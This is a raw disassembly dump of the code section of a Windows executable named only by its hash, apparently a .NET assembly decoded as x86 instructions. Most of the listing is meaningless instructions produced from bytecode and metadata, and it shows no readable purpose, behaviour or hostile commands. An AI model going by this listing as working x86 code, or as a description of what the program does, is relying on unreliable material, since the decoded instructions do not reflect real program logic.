
c42ab04f9d19b18d2d145a32a98e02e8070d25275aad11b3c9917c3cdd370c10.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	iret   
  402001:	ja     0x402003
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x248800
  402013:	add    BYTE PTR [ebx+ecx*2],bh
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    eax,DWORD PTR [eax]
  40201e:	add    BYTE PTR [esi],al
  402020:	les    ebp,FWORD PTR [edi+0x0]
  402023:	add    BYTE PTR [eax+0x6],dl
  402026:	add    BYTE PTR [eax],al
  402028:	adc    al,0x76
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [ecx],al
	...
  40204e:	add    BYTE PTR [eax],al
  402050:	jle    0x40207a
  402052:	sldt   WORD PTR [eax]
  402055:	push   es
  402056:	sub    BYTE PTR [eax],bl
  402058:	add    BYTE PTR [eax],al
  40205a:	or     ch,BYTE PTR [edi+0x19]
  40205d:	add    BYTE PTR [eax],al
  40205f:	or     ch,BYTE PTR [eax]
  402061:	sbb    al,BYTE PTR [eax]
  402063:	add    BYTE PTR [edx],cl
  402065:	outs   dx,DWORD PTR ds:[esi]
  402066:	sbb    eax,DWORD PTR [eax]
  402068:	add    BYTE PTR [edx],cl
  40206a:	sub    BYTE PTR [eax+eax*1],bl
  40206d:	add    BYTE PTR [edx],cl
  40206f:	sub    dl,BYTE PTR [ebx]
  402071:	xor    BYTE PTR [edx],al
  402073:	add    BYTE PTR [ebp+0x0],dh
  402076:	add    BYTE PTR [eax],al
  402078:	add    DWORD PTR [eax],eax
  40207a:	add    BYTE PTR [ecx],dl
  40207c:	sub    BYTE PTR ds:0xa0a0000,bl
  402082:	push   es
  402083:	sub    BYTE PTR [esi],bl
  402085:	add    BYTE PTR [eax],al
  402087:	or     ch,BYTE PTR [edi+0x1f]
  40208a:	add    BYTE PTR [eax],al
  40208c:	or     ch,BYTE PTR [edi+0x20]
  40208f:	add    BYTE PTR [eax],al
  402091:	or     ch,BYTE PTR [eax]
  402093:	and    DWORD PTR [eax],eax
  402095:	add    BYTE PTR [edx],cl
  402097:	outs   dx,DWORD PTR ds:[esi]
  402098:	and    al,BYTE PTR [eax]
  40209a:	add    BYTE PTR [edx],cl
  40209c:	sub    BYTE PTR [ebx],ah
  40209e:	add    BYTE PTR [eax],al
  4020a0:	or     ch,BYTE PTR [edi+0x22]
  4020a3:	add    BYTE PTR [eax],al
  4020a5:	or     ch,BYTE PTR [esi]
  4020a7:	dec    eax
  4020a8:	sub    BYTE PTR [ecx],ah
  4020aa:	add    BYTE PTR [eax],al
  4020ac:	or     ch,BYTE PTR [edi+0x22]
  4020af:	add    BYTE PTR [eax],al
  4020b1:	or     al,BYTE PTR [esi]
  4020b3:	outs   dx,DWORD PTR ds:[esi]
  4020b4:	and    al,0x0
  4020b6:	add    BYTE PTR [edx],cl
  4020b8:	outs   dx,DWORD PTR ds:[esi]
  4020b9:	and    eax,0x6f0a0000
  4020be:	add    BYTE PTR es:[eax],al
  4020c1:	or     ch,BYTE PTR [esi]
  4020c3:	sub    al,0x28
  4020c5:	and    DWORD PTR [eax],eax
  4020c7:	add    BYTE PTR [edx],cl
  4020c9:	outs   dx,DWORD PTR ds:[esi]
  4020ca:	and    al,BYTE PTR [eax]
  4020cc:	add    BYTE PTR [edx],cl
  4020ce:	push   es
  4020cf:	outs   dx,DWORD PTR ds:[esi]
  4020d0:	and    al,0x0
  4020d2:	add    BYTE PTR [edx],cl
  4020d4:	outs   dx,DWORD PTR ds:[esi]
  4020d5:	and    eax,0x6f0a0000
  4020da:	daa    
  4020db:	add    BYTE PTR [eax],al
  4020dd:	or     ch,BYTE PTR [esi]
  4020df:	adc    BYTE PTR [esi],al
  4020e1:	jb     0x4020e4
  4020e3:	add    BYTE PTR [eax],al
  4020e5:	jo     0x40215a
  4020e7:	sub    BYTE PTR [eax],al
  4020e9:	add    BYTE PTR [edx],cl
  4020eb:	outs   dx,DWORD PTR ds:[esi]
  4020ec:	and    BYTE PTR [eax],al
  4020ee:	add    BYTE PTR [edx],cl
  4020f0:	sub    al,BYTE PTR [eax]
  4020f2:	add    BYTE PTR [eax],al
  4020f4:	sbb    esi,DWORD PTR [eax]
  4020f6:	or     BYTE PTR [eax],al
  4020f8:	inc    esi
  4020f9:	add    al,BYTE PTR [eax]
  4020fb:	add    BYTE PTR [edx],al
  4020fd:	add    BYTE PTR [eax],al
  4020ff:	adc    DWORD PTR [eax],ebp
  402101:	add    al,BYTE PTR [eax]
  402103:	add    BYTE PTR [esi],al
  402105:	adc    al,0xa
  402107:	adc    al,0xb
  402109:	push   ss
  40210a:	or     al,0x16
  40210c:	or     eax,0x38071316
  402111:	mov    ebp,0x2000000
  402116:	adc    DWORD PTR [edi],eax
  402118:	call   0x2870:0xd72
  40211f:	sub    DWORD PTR [eax],eax
  402121:	add    BYTE PTR [edx],cl
  402123:	sub    eax,0x7110210
  402128:	call   0x2870:0x1372
  40212f:	sub    DWORD PTR [eax],eax
  402131:	add    BYTE PTR [edx],cl
  402133:	sub    al,0x7
  402135:	sub    BYTE PTR [ecx],al
  402137:	add    BYTE PTR [eax],al
  402139:	push   es
  40213a:	sbb    ch,BYTE PTR [edx]
  40213c:	jb     0x402157
  40213e:	add    BYTE PTR [eax],al
  402140:	jo     0x402144
  402142:	adc    DWORD PTR [edi],eax
  402144:	call   0xa00:0x2a281b
  40214b:	sub    al,0x4
  40214d:	pop    ss
  40214e:	or     al,0x2b
  402150:	jnp    0x4021c4
  402152:	sub    DWORD PTR [eax],eax
  402154:	add    BYTE PTR [eax+0x2],dh
  402157:	adc    DWORD PTR [edi],eax
  402159:	call   0xa00:0x2a281b
  402160:	sub    al,0x4
  402162:	pop    ss
  402163:	or     eax,0x1102662b
  402168:	pop    es
  402169:	call   0x1b70:0x3b72
  402170:	outs   dx,DWORD PTR ds:[esi]
  402171:	sub    eax,DWORD PTR [eax]
  402173:	add    BYTE PTR [edx],cl
  402175:	sub    al,0xe
  402177:	add    dl,BYTE PTR [ecx]
  402179:	pop    es
  40217a:	call   0x0:0x2c6f0b1f
  402181:	or     cl,BYTE PTR [ebx]
  402183:	sub    eax,DWORD PTR [edi+0x2]
  402186:	adc    DWORD PTR [edi],eax
  402188:	call   0x1b70:0x5372
  40218f:	outs   dx,DWORD PTR ds:[esi]
  402190:	sub    eax,DWORD PTR [eax]
  402192:	add    BYTE PTR [edx],cl
  402194:	sub    al,0xe
  402196:	add    dl,BYTE PTR [ecx]
  402198:	pop    es
  402199:	call   0x0:0x2c6f0e1f
  4021a0:	or     cl,BYTE PTR [edx]
  4021a2:	sub    ebp,DWORD PTR [eax]
  4021a4:	sub    BYTE PTR ds:0x280a0000,ch
  4021aa:	add    BYTE PTR cs:[eax],al
  4021ad:	or     ch,BYTE PTR [eax]
  4021af:	push   cs
  4021b0:	add    BYTE PTR [eax],al
  4021b2:	push   es
  4021b3:	pop    ss
  4021b4:	lea    edx,[eax+eax*1]
  4021b7:	add    BYTE PTR [ecx],al
  4021b9:	and    eax,0x7110216
  4021be:	call   0xa00:0x2f28a2
  4021c5:	outs   dx,DWORD PTR ds:[esi]
  4021c6:	xor    BYTE PTR [eax],al
  4021c8:	add    BYTE PTR [edx],cl
  4021ca:	sbb    DWORD PTR [edx],ebp
  4021cc:	adc    DWORD PTR [edi],eax
  4021ce:	pop    ss
  4021cf:	pop    eax
  4021d0:	adc    eax,DWORD PTR [edi]
  4021d2:	adc    DWORD PTR [edi],eax
  4021d4:	add    cl,BYTE PTR [esi-0xc6c097]
  4021da:	(bad)  
  4021db:	inc    DWORD PTR [esi]
  4021dd:	sub    BYTE PTR [ecx],dh
  4021df:	add    BYTE PTR [eax],al
  4021e1:	or     ch,BYTE PTR ds:0x12b0603
  4021e7:	pop    es
  4021e8:	adc    eax,DWORD PTR [ecx+edx*1]
  4021eb:	add    al,0x28
  4021ed:	xor    DWORD PTR [eax],eax
  4021ef:	add    BYTE PTR [edx],cl
  4021f1:	sub    al,0x11
  4021f3:	sub    BYTE PTR ds:0x280a0000,ch
  4021f9:	or     al,0x0
  4021fb:	add    BYTE PTR [esi],al
  4021fd:	outs   dx,DWORD PTR ds:[esi]
  4021fe:	xor    BYTE PTR [eax],al
  402200:	add    BYTE PTR [edx],cl
  402202:	sbb    BYTE PTR [edx],ch
  402204:	push   es
  402205:	sub    BYTE PTR [ecx],dh
  402207:	add    BYTE PTR [eax],al
  402209:	or     ch,BYTE PTR ds:0x31280719
  40220f:	add    BYTE PTR [eax],al
  402211:	or     ch,BYTE PTR ds:0x2d2811
  402217:	add    BYTE PTR [edx],cl
  402219:	sub    BYTE PTR [ebx],cl
  40221b:	add    BYTE PTR [eax],al
  40221d:	push   es
  40221e:	outs   dx,DWORD PTR ds:[esi]
  40221f:	xor    BYTE PTR [eax],al
  402221:	add    BYTE PTR [edx],cl
  402223:	sbb    al,0x2a
  402225:	add    BYTE PTR [ecx],dl
  402227:	add    al,0x28
  402229:	xor    al,BYTE PTR [eax]
  40222b:	add    BYTE PTR [edx],cl
  40222d:	fidivr WORD PTR es:[eax]
  402230:	adc    ecx,DWORD PTR [eax]
  402232:	sub    BYTE PTR ds:0x280a0000,ch
  402238:	add    BYTE PTR cs:[eax],al
  40223b:	or     ch,BYTE PTR [eax]
  40223d:	or     eax,0x18060000
  402242:	lea    edx,[eax+eax*1]
  402245:	add    BYTE PTR [ecx],al
  402247:	and    eax,0xa2041116
  40224c:	and    eax,0x6f081117
  402251:	xor    eax,DWORD PTR [eax]
  402253:	add    BYTE PTR [edx],cl
  402255:	mov    ds:0x2f28,al
  40225a:	or     ch,BYTE PTR [edi+0x30]
  40225d:	add    BYTE PTR [eax],al
  40225f:	or     bl,BYTE PTR [ebx]
  402261:	adc    ecx,DWORD PTR [ecx]
  402263:	fstp   st(3)
  402265:	add    BYTE PTR [eax],al
  402267:	add    BYTE PTR [ebx+edx*1],dl
  40226a:	add    eax,0x6061316
  40226f:	sub    BYTE PTR [ecx],dh
  402271:	add    BYTE PTR [eax],al
  402273:	or     ch,BYTE PTR ds:0xa2c0917
  402279:	push   es
  40227a:	sub    BYTE PTR [eax+eax*1],dh
  40227d:	add    BYTE PTR [edx],cl
  40227f:	adc    eax,DWORD PTR ds:0x28061f2b
  402285:	xor    eax,0x130a0000
  40228a:	add    eax,0x2c09152b
  40228f:	or     al,BYTE PTR [edi]
  402291:	sub    BYTE PTR [esi],dh
  402293:	add    BYTE PTR [eax],al
  402295:	or     dl,BYTE PTR [ebx]
  402297:	add    eax,0x2807082b
  40229c:	aaa    
  40229d:	add    BYTE PTR [eax],al
  40229f:	or     dl,BYTE PTR [ebx]
  4022a1:	add    eax,0xde061317
  4022a6:	dec    esi
  4022a7:	adc    ecx,DWORD PTR [edx]
  4022a9:	sub    BYTE PTR ds:0x280a0000,ch
  4022af:	or     DWORD PTR [eax],eax
  4022b1:	add    BYTE PTR [esi],al
  4022b3:	adc    DWORD PTR [edx],ecx
  4022b5:	outs   dx,DWORD PTR ds:[esi]
  4022b6:	xor    eax,DWORD PTR [eax]
  4022b8:	add    BYTE PTR [edx],cl
  4022ba:	outs   dx,DWORD PTR ds:[esi]
  4022bb:	cmp    BYTE PTR [eax],al
  4022bd:	add    BYTE PTR [edx],cl
  4022bf:	fidiv  WORD PTR [ebx+edx*1]
  4022c2:	or     ebp,DWORD PTR [eax]
  4022c4:	sub    eax,0x280a0000
  4022c9:	or     DWORD PTR [eax],eax
  4022cb:	add    BYTE PTR [esi],al
  4022cd:	adc    DWORD PTR [ebx],ecx
  4022cf:	outs   dx,DWORD PTR ds:[esi]
  4022d0:	xor    eax,DWORD PTR [eax]
  4022d2:	add    BYTE PTR [edx],cl
  4022d4:	outs   dx,DWORD PTR ds:[esi]
  4022d5:	cmp    BYTE PTR [eax],al
  4022d7:	add    BYTE PTR [edx],cl
  4022d9:	ficomp WORD PTR [edx]
  4022db:	adc    ecx,DWORD PTR [eax+ebp*1]
  4022de:	sub    eax,0x280a0000
  4022e3:	or     DWORD PTR [eax],eax
  4022e5:	add    BYTE PTR [esi],al
  4022e7:	adc    DWORD PTR [edi+ebp*2],ecx
  4022ea:	cmp    DWORD PTR [eax],eax
  4022ec:	add    BYTE PTR [edx],cl
  4022ee:	outs   dx,DWORD PTR ds:[esi]
  4022ef:	cmp    BYTE PTR [eax],al
  4022f1:	add    BYTE PTR [edx],cl
  4022f3:	fiadd  WORD PTR [eax]
  4022f5:	or     BYTE PTR ds:0x2c051135,ch
  4022fb:	xor    DWORD PTR [ecx],edx
  4022fd:	add    eax,0x112c2c8e
  402302:	add    eax,0x13160d13
  402307:	push   cs
  402308:	sub    ebx,DWORD PTR [ecx]
  40230a:	adc    DWORD PTR ds:0x139a0e11,ecx
  402310:	movaps xmm2,XMMWORD PTR [eax]
  402313:	add    BYTE PTR [eax],al
  402315:	push   es
  402316:	adc    DWORD PTR [edi],ecx
  402318:	sub    BYTE PTR [eax+eax*1],bl
  40231b:	add    BYTE PTR [edx],cl
  40231d:	adc    DWORD PTR [esi],ecx
  40231f:	pop    ss
  402320:	pop    eax
  402321:	adc    ecx,DWORD PTR [esi]
  402323:	adc    DWORD PTR [esi],ecx
  402325:	adc    DWORD PTR ds:0xdf32698e,ecx
  40232b:	sub    ecx,DWORD PTR [esi]
  40232d:	adc    DWORD PTR [esi],eax
  40232f:	sub    al,0xa
  402331:	sub    BYTE PTR [eax],cl
  402333:	add    BYTE PTR [eax],al
  402335:	push   es
  402336:	sub    BYTE PTR [edx],bh
  402338:	add    BYTE PTR [eax],al
  40233a:	or     dl,BYTE PTR [ecx]
  40233c:	push   es
  40233d:	sub    eax,0x162a1702
  402342:	sub    dl,BYTE PTR [ecx]
  402344:	or     DWORD PTR [edx],ebp
  402346:	add    BYTE PTR [eax],al
  402348:	add    DWORD PTR [eax+eax*1],esi
  40234b:	add    BYTE PTR [eax],al
  40234d:	add    BYTE PTR [esi],ah
  40234f:	add    DWORD PTR [edx],ecx
  402351:	xor    BYTE PTR [ecx],al
  402353:	cmp    BYTE PTR [eax],bl
  402355:	add    BYTE PTR [eax],al
  402357:	add    DWORD PTR [eax],eax
  402359:	add    BYTE PTR [esi+0x1],ch
  40235c:	cmp    DWORD PTR [edi+0x191a01],esp
  402362:	add    BYTE PTR [ecx],al
  402364:	add    BYTE PTR [eax],al
  402366:	outs   dx,BYTE PTR ds:[esi]
  402367:	add    DWORD PTR [ecx],edi
  402369:	rol    DWORD PTR [ecx],0x1a
  40236c:	sbb    al,BYTE PTR [eax]
  40236e:	add    BYTE PTR [ecx],al
  402370:	add    BYTE PTR [eax],al
  402372:	outs   dx,BYTE PTR ds:[esi]
  402373:	add    DWORD PTR [ecx],edi
  402375:	fild   DWORD PTR [ecx]
  402377:	sbb    bl,BYTE PTR [ebx]
  402379:	add    BYTE PTR [eax],al
  40237b:	add    DWORD PTR [esi],ebx
  40237d:	add    ch,BYTE PTR [eax]
  40237f:	cmp    eax,DWORD PTR [eax]
  402381:	add    BYTE PTR [edx],cl
  402383:	sub    ch,BYTE PTR [esi+0x507e]
  402389:	add    al,0x2d
  40238b:	push   ds
  40238c:	jb     0x4023ff
  40238e:	add    BYTE PTR [eax],al
  402390:	jo     0x402362
  402392:	push   es
  402393:	add    BYTE PTR [eax],al
  402395:	add    ch,BYTE PTR [eax]
  402397:	cmp    al,0x0
  402399:	add    BYTE PTR [edx],cl
  40239b:	outs   dx,DWORD PTR ds:[esi]
  40239c:	cmp    eax,0x730a0000
  4023a1:	add    BYTE PTR ds:[eax],al
  4023a4:	or     al,BYTE PTR [eax+0x4000050]
  4023aa:	jle    0x4023fc
  4023ac:	add    BYTE PTR [eax],al
  4023ae:	add    al,0x2a
  4023b0:	sbb    bh,BYTE PTR [esi+0x51]
  4023b3:	add    BYTE PTR [eax],al
  4023b5:	add    al,0x2a
  4023b7:	push   ds
  4023b8:	add    al,BYTE PTR [eax+0x4000051]
  4023be:	sub    dl,BYTE PTR [esi+0x28]
  4023c1:	add    eax,0x72060000
  4023c6:	fwait
  4023c7:	add    BYTE PTR [eax],al
  4023c9:	jo     0x402449
  4023cb:	push   ecx
  4023cc:	add    BYTE PTR [eax],al
  4023ce:	add    al,0x6f
  4023d0:	aas    
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	or     ch,BYTE PTR [edx]
  4023d5:	push   esi
  4023d6:	sub    BYTE PTR ds:0x72060000,al
  4023dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023dd:	add    BYTE PTR [eax],al
  4023df:	jo     0x40245f
  4023e1:	push   ecx
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	add    al,0x6f
  4023e6:	aas    
  4023e7:	add    BYTE PTR [eax],al
  4023e9:	or     ch,BYTE PTR [edx]
  4023eb:	push   esi
  4023ec:	sub    BYTE PTR ds:0x72060000,al
  4023f2:	mov    bl,0x0
  4023f4:	add    BYTE PTR [eax+0x7e],dh
  4023f7:	push   ecx
  4023f8:	add    BYTE PTR [eax],al
  4023fa:	add    al,0x6f
  4023fc:	aas    
  4023fd:	add    BYTE PTR [eax],al
  4023ff:	or     ch,BYTE PTR [edx]
  402401:	push   esi
  402402:	sub    BYTE PTR ds:0x72060000,al
  402408:	rol    DWORD PTR [eax],0x0
  40240b:	jo     0x40248b
  40240d:	push   ecx
  40240e:	add    BYTE PTR [eax],al
  402410:	add    al,0x6f
  402412:	aas    
  402413:	add    BYTE PTR [eax],al
  402415:	or     ch,BYTE PTR [edx]
  402417:	push   esi
  402418:	sub    BYTE PTR ds:0x72060000,al
  40241e:	or     eax,0x7e700001
  402423:	push   ecx
  402424:	add    BYTE PTR [eax],al
  402426:	add    al,0x6f
  402428:	aas    
  402429:	add    BYTE PTR [eax],al
  40242b:	or     ch,BYTE PTR [edx]
  40242d:	push   esi
  40242e:	sub    BYTE PTR ds:0x72060000,al
  402434:	dec    ebx
  402435:	add    DWORD PTR [eax],eax
  402437:	jo     0x4024b7
  402439:	push   ecx
  40243a:	add    BYTE PTR [eax],al
  40243c:	add    al,0x6f
  40243e:	aas    
  40243f:	add    BYTE PTR [eax],al
  402441:	or     ch,BYTE PTR [edx]
  402443:	push   esi
  402444:	sub    BYTE PTR ds:0x72060000,al
  40244a:	arpl   WORD PTR [ecx],ax
  40244c:	add    BYTE PTR [eax+0x7e],dh
  40244f:	push   ecx
  402450:	add    BYTE PTR [eax],al
  402452:	add    al,0x6f
  402454:	aas    
  402455:	add    BYTE PTR [eax],al
  402457:	or     ch,BYTE PTR [edx]
  402459:	push   esi
  40245a:	sub    BYTE PTR ds:0x72060000,al
  402460:	test   DWORD PTR [ecx],eax
  402462:	add    BYTE PTR [eax+0x7e],dh
  402465:	push   ecx
  402466:	add    BYTE PTR [eax],al
  402468:	add    al,0x6f
  40246a:	aas    
  40246b:	add    BYTE PTR [eax],al
  40246d:	or     ch,BYTE PTR [edx]
  40246f:	push   esi
  402470:	sub    BYTE PTR ds:0x72060000,al
  402476:	xchg   ecx,eax
  402477:	add    DWORD PTR [eax],eax
  402479:	jo     0x4024f9
  40247b:	push   ecx
  40247c:	add    BYTE PTR [eax],al
  40247e:	add    al,0x6f
  402480:	aas    
  402481:	add    BYTE PTR [eax],al
  402483:	or     ch,BYTE PTR [edx]
  402485:	add    BYTE PTR [eax],al
  402487:	add    BYTE PTR [edx+0x53],al
  40248a:	dec    edx
  40248b:	inc    edx
  40248c:	add    DWORD PTR [eax],eax
  40248e:	add    DWORD PTR [eax],eax
  402490:	add    BYTE PTR [eax],al
  402492:	add    BYTE PTR [eax],al
  402494:	or     al,0x0
  402496:	add    BYTE PTR [eax],al
  402498:	jbe    0x4024ce
  40249a:	xor    BYTE PTR cs:[esi],ch
  40249d:	xor    esi,DWORD PTR [eax]
  40249f:	xor    esi,DWORD PTR [ecx]
  4024a1:	cmp    DWORD PTR [eax],eax
  4024a3:	add    BYTE PTR [eax],al
  4024a5:	add    BYTE PTR ds:0x6c00,al
  4024ab:	add    BYTE PTR [eax+0x9],bh
  4024ae:	add    BYTE PTR [eax],al
  4024b0:	and    edi,DWORD PTR [esi+0x0]
  4024b3:	add    ah,ah
  4024b5:	or     DWORD PTR [eax],eax
  4024b7:	add    BYTE PTR [eax+0x2300000d],bh
  4024bd:	push   ebx
  4024be:	je     0x402532
  4024c0:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4024c7:	add    BYTE PTR [edi+edx*1+0x1a40000],bl
  4024ce:	add    BYTE PTR [eax],al
  4024d0:	and    edx,DWORD PTR [ebp+0x53]
  4024d3:	add    BYTE PTR [eax+0x19],al
  4024d6:	add    BYTE PTR [eax],al
  4024d8:	adc    BYTE PTR [eax],al
  4024da:	add    BYTE PTR [eax],al
  4024dc:	and    eax,DWORD PTR [edi+0x55]
  4024df:	dec    ecx
  4024e0:	inc    esp
  4024e1:	add    BYTE PTR [eax],al
  4024e3:	add    BYTE PTR [eax+0x19],dl
  4024e6:	add    BYTE PTR [eax],al
  4024e8:	in     al,dx
  4024e9:	xor    DWORD PTR [eax],eax
  4024eb:	add    BYTE PTR [ebx],ah
  4024ed:	inc    edx
  4024ee:	ins    BYTE PTR es:[edi],dx
  4024ef:	outs   dx,DWORD PTR ds:[esi]
  4024f0:	bound  eax,QWORD PTR [eax]
  4024f2:	add    BYTE PTR [eax],al
  4024f4:	add    BYTE PTR [eax],al
  4024f6:	add    BYTE PTR [eax],al
  4024f8:	add    al,BYTE PTR [eax]
  4024fa:	add    BYTE PTR [ecx],al
  4024fc:	push   edi
  4024fd:	sbb    eax,0x10901a2
  402502:	add    BYTE PTR [eax],al
  402504:	add    dl,bh
  402506:	add    DWORD PTR [ebx],esi
  402508:	add    BYTE PTR [esi],dl
  40250a:	add    BYTE PTR [eax],al
  40250c:	add    DWORD PTR [eax],eax
  40250e:	add    BYTE PTR [eax],al
  402510:	das    
  402511:	add    BYTE PTR [eax],al
  402513:	add    BYTE PTR [esi],al
  402515:	add    BYTE PTR [eax],al
  402517:	add    BYTE PTR [ecx+0x0],dl
  40251a:	add    BYTE PTR [eax],al
  40251c:	adc    BYTE PTR [eax],al
  40251e:	add    BYTE PTR [eax],al
  402520:	add    al,BYTE PTR [eax]
  402522:	add    BYTE PTR [eax],al
  402524:	aas    
  402525:	add    BYTE PTR [eax],al
  402527:	add    BYTE PTR [edi+0x0],cl
  40252a:	add    BYTE PTR [eax],al
  40252c:	sbb    BYTE PTR [eax],al
  40252e:	add    BYTE PTR [eax],al
  402530:	add    al,BYTE PTR [eax]
  402532:	add    BYTE PTR [eax],al
  402534:	add    DWORD PTR [eax],eax
  402536:	add    BYTE PTR [eax],al
  402538:	or     eax,DWORD PTR [eax]
  40253a:	add    BYTE PTR [eax],al
  40253c:	or     al,0x0
  40253e:	add    BYTE PTR [eax],al
  402540:	add    DWORD PTR [eax],eax
  402542:	add    BYTE PTR [eax],al
  402544:	add    eax,DWORD PTR [eax]
  402546:	add    BYTE PTR [eax],al
  402548:	add    DWORD PTR [eax],eax
  40254a:	add    BYTE PTR [eax],al
  40254c:	add    BYTE PTR [eax],al
  40254e:	in     eax,dx
  40254f:	add    al,0x1
  402551:	add    BYTE PTR [eax],al
  402553:	add    BYTE PTR [eax],al
  402555:	add    BYTE PTR [esi],al
  402557:	add    BYTE PTR [eax],ch
  402559:	add    al,0x6a
  40255b:	or     al,BYTE PTR [esi]
  40255d:	add    al,ah
  40255f:	add    cl,BYTE PTR ds:0xd2000b0a
  402565:	or     al,BYTE PTR [eax]
  402567:	add    BYTE PTR [esi],al
  402569:	add    BYTE PTR ds:0x60a4b03,cl
  40256f:	add    BYTE PTR [esp+eax*1-0x5a],bh
  402573:	push   es
  402574:	push   es
  402575:	add    BYTE PTR [edx],bh
  402577:	add    edi,DWORD PTR [edx]
  402579:	or     BYTE PTR [esi],al
  40257b:	add    ch,ch
  40257d:	add    edi,DWORD PTR [edx]
  40257f:	or     BYTE PTR [esi],al
  402581:	add    BYTE PTR [edx],cl
  402583:	add    al,0x3a
  402585:	or     BYTE PTR [esi],al
  402587:	add    BYTE PTR [eax+0x6083a04],dh
  40258d:	add    BYTE PTR [eax+0x4],cl
  402590:	cmp    cl,BYTE PTR [eax]
  402592:	push   es
  402593:	add    BYTE PTR [ecx+0x4],ah
  402596:	cmp    cl,BYTE PTR [eax]
  402598:	push   es
  402599:	add    BYTE PTR [ebx+eax*1+0x3a],ch
  40259d:	or     BYTE PTR [esi],al
  40259f:	add    BYTE PTR [ecx+0x6083a03],cl
  4025a5:	add    BYTE PTR [edi+0x60aa203],ch
  4025ab:	add    BYTE PTR [esi+0x60aa202],bh
  4025b1:	add    BYTE PTR [ecx+0x3],dl
  4025b4:	cmp    cl,BYTE PTR [eax]
  4025b6:	push   es
  4025b7:	add    BYTE PTR [ecx],ah
  4025b9:	add    edi,DWORD PTR [edx]
  4025bb:	or     BYTE PTR [esi],al
  4025bd:	add    BYTE PTR [edx+0x6083a04],dl
  4025c3:	add    cl,cl
  4025c5:	add    al,0x6a
  4025c7:	or     al,BYTE PTR [esi]
  4025c9:	add    al,bl
  4025cb:	or     esp,DWORD PTR [esi-0x56fff9fa]
  4025d1:	add    BYTE PTR [edi],al
  4025d3:	add    eax,0x8270006
  4025d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d9:	push   es
  4025da:	push   es
  4025db:	add    cl,dl
  4025dd:	add    esp,DWORD PTR [esi+0x73000606]
  4025e3:	or     BYTE PTR [esi+0x58000606],ah
  4025e9:	or     BYTE PTR [ecx],ch
  4025eb:	add    BYTE PTR [edx],cl
  4025ed:	add    BYTE PTR [eax+ecx*1+0x7a],cl
  4025f1:	add    eax,0x87b0006
  4025f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025f7:	push   es
  4025f8:	push   cs
  4025f9:	add    BYTE PTR [edx+0x6097002],cl
  4025ff:	add    BYTE PTR [ecx+0x60a0d02],ah
  402605:	add    BYTE PTR [edi+0x2],ch
  402608:	push   0xa
  40260a:	push   es
  40260b:	add    BYTE PTR [eax+0x9],ah
  40260e:	mov    ds:0xa200060a,al
  402613:	or     BYTE PTR [edx],dl
  402615:	or     BYTE PTR [esi],cl
  402617:	add    BYTE PTR [edx+0x2],bl
  40261a:	lds    eax,FWORD PTR ds:0x2f4000e
  402620:	lds    eax,FWORD PTR ds:0xd6e0006
  402626:	cmp    cl,BYTE PTR [eax]
  402628:	push   cs
  402629:	add    BYTE PTR [esi+0x60a0d08],ch
  40262f:	add    BYTE PTR [edx+0x1],bl
  402632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402633:	push   es
  402634:	push   es
  402635:	add    BYTE PTR [edx],ah
  402637:	add    eax,0x60c98
  40263c:	ror    DWORD PTR [eax],1
  40263e:	adc    cl,BYTE PTR [eax]
  402640:	push   es
  402641:	add    BYTE PTR [ebx+0x5],dl
  402644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402645:	push   es
  402646:	push   es
  402647:	add    BYTE PTR [ecx+0x606a608],dl
  40264d:	add    BYTE PTR [ecx+0x6002909],dh
  402653:	add    BYTE PTR [ecx+ecx*1-0x5a],cl
  402657:	push   es
  402658:	push   es
  402659:	add    BYTE PTR [ebp+0xa002905],dh
  40265f:	add    BYTE PTR [edi+0x6057a01],ah
  402665:	add    BYTE PTR [edi+0x606a601],dl
  40266b:	add    BYTE PTR [ecx+eax*1],cl
  40266e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40266f:	push   es
  402670:	add    BYTE PTR [eax],al
  402672:	add    BYTE PTR [eax],al
  402674:	and    BYTE PTR [eax],al
  402676:	add    BYTE PTR [eax],al
  402678:	add    BYTE PTR [eax],al
  40267a:	add    DWORD PTR [eax],eax
  40267c:	add    DWORD PTR [eax],eax
  40267e:	add    BYTE PTR [ecx],0x10
  402681:	add    BYTE PTR [edi],bh
  402683:	or     eax,0x510000
  402688:	add    DWORD PTR [eax],eax
  40268a:	add    DWORD PTR [eax],eax
  40268c:	add    BYTE PTR [ecx],0x10
  40268f:	add    BYTE PTR [edx+0xd],ch
  402692:	add    BYTE PTR [eax],al
  402694:	push   ecx
  402695:	add    BYTE PTR [edx],al
  402697:	add    BYTE PTR [ecx],al
  402699:	add    BYTE PTR [eax-0x4ffefff],al
  40269f:	add    al,0x0
  4026a1:	add    BYTE PTR [ecx+0x0],dl
  4026a4:	or     eax,DWORD PTR [eax]
  4026a6:	add    DWORD PTR [eax],eax
  4026a8:	add    DWORD PTR [ecx],0x5db0010
  4026ae:	cmc    
  4026af:	or     dl,BYTE PTR [ecx+0x0]
  4026b2:	push   eax
  4026b3:	add    BYTE PTR [ecx],al
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	add    BYTE PTR [eax],dl
  4026b9:	add    cl,ah
  4026bb:	or     dh,ch
  4026bd:	or     dl,BYTE PTR [ecx+0x0]
  4026c0:	push   eax
  4026c1:	add    BYTE PTR [eax+eax*1],al
  4026c4:	push   ebx
  4026c5:	sub    cl,0x7
  4026c8:	or     ebp,DWORD PTR ds:0x1628053
  4026ce:	or     ebp,DWORD PTR ds:0x8858053
  4026d4:	or     ebp,DWORD PTR ds:0x9f18053
  4026da:	or     ebp,DWORD PTR ds:0xbdf8053
  4026e0:	or     ebp,DWORD PTR ds:0x7e98053
  4026e6:	or     ebp,DWORD PTR ds:0x7c98053
  4026ec:	or     ebp,DWORD PTR ds:0x9dd8053
